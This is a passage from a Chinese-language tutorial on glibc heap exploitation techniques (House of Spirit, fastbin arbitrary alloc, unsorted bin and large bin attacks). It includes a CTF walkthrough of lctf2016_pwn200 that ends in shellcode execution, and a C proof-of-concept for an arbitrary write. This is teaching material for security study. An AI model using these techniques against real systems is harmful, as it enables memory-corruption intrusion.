<li>fake chunk 地址需要对齐 <code>MALLOC_ALIGN_MASK</code> 。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">       multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line">	</span><br><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast())</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 的 <strong>next chunk</strong> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">       of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">       after getting the lock.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">        assert(locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">    &#125;)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>pwndbg 的 try_free 命令可以检查是否能成功 free 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/dc5224340a5408c0a246535b4277c389.png"
                      alt="在这里插入图片描述"
                ></p>
<p> 例题：lctf2016_pwn200</p>
<p>本上什么保护都没开，可以直接在堆栈中部署 shellcode 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/2c5fc176e33bedac5f98efe6513de64d.png"
                      alt="image-20220214184043313"
                ></p>
<ul>
<li><p><code>main</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_40079D</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">sub_400A8E</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>主要调用 <code>sub_400A8E</code> 函数。</p>
</li>
<li><p><code>sub_400A8E</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;who are u?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;name[i], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( name[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      name[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s, welcome to ISCC~ \n&quot;</span>, name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me your id ~~?&quot;</span>);</span><br><span class="line">  <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_400A29</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>name 存在 off-by-one 漏洞，通过输入 48 字节填充数据可以泄露栈地址 rbp 。</p>
</li>
<li><p>name 本身 48 字节大小可以恰好存下 pwntools 生成的 shellcode 。</p>
</li>
<li><p>获取的 id 写到了栈中，这个可以作为 fake chunk 下一个 chunk 的 size 字段。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400B1F                 call    get_num</span><br><span class="line">.text:0000000000400B24                 cdqe</span><br><span class="line">.text:0000000000400B26                 mov     [rbp+id], rax</span><br></pre></td></tr></table></figure></div></li>
<li><p><code>sub_400A29</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> money[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me money~&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, money, <span class="number">64uLL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, money);</span><br><span class="line">  ptr = dest;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4009C4</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>money 存在缓存区溢出漏洞，可以修改 dest 指针指向 fake chunk 的内存区域，进而将 ptr 修改为该值。</li>
<li>money 本身可以构造 fake chunk 的头部</li>
</ul>
</li>
<li><p><code>sub_4009C4</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4009C4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      num = <span class="built_in">get_num</span>();</span><br><span class="line">      <span class="keyword">if</span> ( num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">alloc</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;good bye~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>delete</code> 函数可以释放 fake chunk ，触发 House Of Spirit 漏洞。</li>
<li><code>alloc</code> 函数可以申请释放的 fake chunk ，从而修改 <code>sub_400A29</code> 的返回地址 为 shellcode 地址。</li>
</ul>
</li>
</ul>
<p>利用过程：</p>
<ol>
<li>name 填入 shellcode ，利用 off-by-one 漏洞获取 rbp 。注意 shellcode 不能有 <code>\x00</code> 字节，否则会截断无法泄露 rbp 。</li>
<li>id 填入 fake chunk 下一个 chunk 的 size 值，填入 0x41 即可。</li>
<li>money 构造 fake 头部，并修改 dest 指向 fake chunk 内存区域</li>
<li>释放 ptr 指针指向的 fake chunk ，触发 House Of Spirit 漏洞。</li>
<li>申请到 fake chunk ，并将 <code>sub_400A29</code> 返回地址修改为 shellcode 地址（rbp-0x50）。<br>以上过程完成 fake chunk 构造和申请，此时栈结构如下图：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/9fa8fdababb35c36a06e85c603520a11.png"
                      alt="在这里插入图片描述"
                ></li>
<li>退出执行 shellcode 获取 shell 。</li>
</ol>
<h2 id="Alloc-to-Stack-Arbitrary-Alloc"><a href="#Alloc-to-Stack-Arbitrary-Alloc" class="headerlink" title="Alloc to Stack &amp; Arbitrary Alloc"></a>Alloc to Stack &amp; Arbitrary Alloc</h2><p>劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的地址处，从而实现控制一些关键数据，比如返回地址等。</p>
<p>fd 指向的内存能申请出来的前提是该内存对应 size 处的值与该 fast bin 对应 size 相同。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line">        idx = fastbin_index(nb);</span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">                errout:</span><br><span class="line">                malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
<p>由于这里的 size 不考虑低 3 比特，并且 libc 或栈地址多数是 0x7f 开头，因此可以通过截取 0x7f 然后用 0x70 的 fastbin 将该内存申请出来。<br>例如修改 fd 指针指向 <code>__realloc_hook</code> 前合适的偏移（通常是 <code>__malloc_hook</code> 往前 0x23 的偏移），两次 <code>malloc(0x60)</code> 申请出该地址的 fake chunk 实现对 <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 的控制。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/a9fa9baa971ea4a92068b2c1f1152188.png"
                      alt="在这里插入图片描述"
                ><br>由于 one_gadget 可能因栈结构不满足条件而失效，可以通过修改 <code>__malloc_hook</code> 为 <code>realloc+偏移</code> ，修改 <code>__realloc_hook</code> 为 <code>one_gadget</code> 改变栈结构来获取 <code>shell</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/98c0f43d533b1ed67fb794ab76a6c6c9.png"
                      alt="在这里插入图片描述"
                ></p>
<p>除了 realloc + 偏移外，还可以通过触发 malloc 报错执行 malloc 来改变栈结构。</p>
<h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><p>由于 unsorted bin 是双向链表，因此在 unsorted bin 链表中必有一个节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/7206f8e4b4483e5869a8033343497c8a.png"
                      alt="image-20220216135528044"
                ></p>
<p>而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，从而获取 libc 的基地址。</p>
<p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure></div>

<p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p>
<h2 id="Unsorted-Bin-Attack-1"><a href="#Unsorted-Bin-Attack-1" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h2><p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="built_in">unsorted_chunks</span> (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span> (av);</span><br></pre></td></tr></table></figure></div>

<p>换而言之，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。通常可以利用此方法向 <code>global_max_fast</code> 写入一个较大的值，从而扩大 fast bin 范围，甚至 <code>fastbinsY</code> 数组溢出 造成任意地址写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f8bb7fdeae34ead63a5ec4ea808a7aab.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ><br>unsorted bin attack 之后，fake chunk 被链入 unsorted bin 中，此时要想将 unsorted bin 申请出来必须通过如下检查：</p>
<ul>
<li>检查 size 是否合法  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">&gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br></pre></td></tr></table></figure></div></li>
<li>unsorted bin chunk 的 bk 字段指向的地址必须为可写  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></div>
  后续会介绍 House of Storm 利用手法，本质是在 unsorted bin attack 的基础上利用 large bin attack 进行两处任意地址写来伪造 fake chunk 的 size 和 bk ，从而将 fake chunk 申请出来。</li>
</ul>
<p>不过从 glibc-2.28 开始会有如下检查，此方法失效。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h1 id="Large-Bin-Attack-House-of-Fun"><a href="#Large-Bin-Attack-House-of-Fun" class="headerlink" title="Large Bin Attack (House of Fun)"></a>Large Bin Attack (House of Fun)</h1><p>Large Bin Attack 就是通过修改位于 large bin 的 chunk 的指针，然后让其它的 chunk 进入 large bin ，借助链表操作在目标地址处写入一个堆的地址。<br>large bin 可以利用的指针有 bk 和 bk_nextsize 。</p>
<h2 id="早期的-Large-Bin-Attack"><a href="#早期的-Large-Bin-Attack" class="headerlink" title="早期的 Large Bin Attack"></a>早期的 Large Bin Attack</h2><p>glibc-2.30 之前，由于 chunk 链入 large bin 的过程中缺乏对 bk 和 bk_nextsize 指针的检查，因此可以 通过修改 bk 和 bk_nextsize 指针进行两处任意地址写。</p>
<p>如果新加入的 chunk <strong>不小于 large bin 中的 chunk</strong> 会进行如下操作：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">       &#123;</span><br><span class="line">         ...</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         victim_index = largebin_index (size);</span><br><span class="line">         bck = bin_at (av, victim_index);</span><br><span class="line">         fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             size |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">   &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">               &#123;</span><br><span class="line">                 ...</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">== (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>
<p>劫持一个 large bin 中一个<strong>在同等大小 chunk 中 bk 方向最靠前的 chunk</strong> 的 <strong>bk</strong> 和 <strong>bk_nextsize</strong> 然后释放一个比该 chunk <strong>稍大一些</strong>的 chunk 就可以实现下图所示效果。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8ada377542ce2b6f3de0cf31202bef1d.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>自 glibc-2.30 开始如果加入的 chunk 不是最小的则在插入链表时会对 bk 指针进行检查。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h2 id="新版本的-Large-Bin-Attack"><a href="#新版本的-Large-Bin-Attack" class="headerlink" title="新版本的 Large Bin Attack"></a>新版本的 Large Bin Attack</h2><p>如果新加入的 chunk <strong>小于 large bin 中的 chunk</strong> 会进行如下操作：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">  &#123;</span><br><span class="line">   ...</span><br><span class="line">   <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">      &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">   ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>如果通过让新加入 large bin 小于 large bin 最小的 chunk 来绕过检查需要伪造 bk 指向的 fake chunk 的 size 字段。并且这里的 bk 是 bins 上的 bk ，不容易劫持。所以一般不会考虑利用 bk 指针进行 large bin attack 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br></pre></td></tr></table></figure></div>

<p><strong>与 bk 不同的是 bk_nextsize 来自的是 fwd(unsorted bin)-&gt; fd 而不是 unsorted bin ，可以劫持。</strong> 因此如果将 large bin 中的<strong>最小</strong>的 chunk 的 <code>bk_nextsize</code> 指向 <code>&amp;target - 0x20</code> 的位置，然后加入一个<strong>更小</strong> chunk 就会将 target 写入新加入 chunk 的地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/dd2efd0fb9e0eb7cf2d69e9ea31f41ac.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
[poc](https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/large_bin_attack) 如下：

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  </span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>除了申请更大的 chunk 外，也可以通过申请较小的 chunk 来触发 large bin attack 。因为从 unsorted bin 中直接切割 chunk 的条件中 <code>victim == av-&gt;last_remainder</code> 没有满足（因为成为 last_remainder 的条件之一是大小在 small bin 范围内），最终 unsorted bin 中的 chunk 进入 large bin 中触发 large bin attack 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>
<p>之后，程序会在 large bin 中按 size 升序寻找合适 chunk 来切割出所需的内存。由于 large bin 通过 <code>first (bin)-&gt;bk_nextsize</code> 访问最小的 chunk ，因此最先查找到的是刚刚进入 large bin 的 chunk 并且该 chunk 大小满足条件。之后该 chunk 会从 large bin 中取出然后从中切下所需的内存并将剩余部分放入 unsorted bin 。因此最终写入 target 的值是最开始修改了 bk_nextsize 的 chunk 的地址。</p>
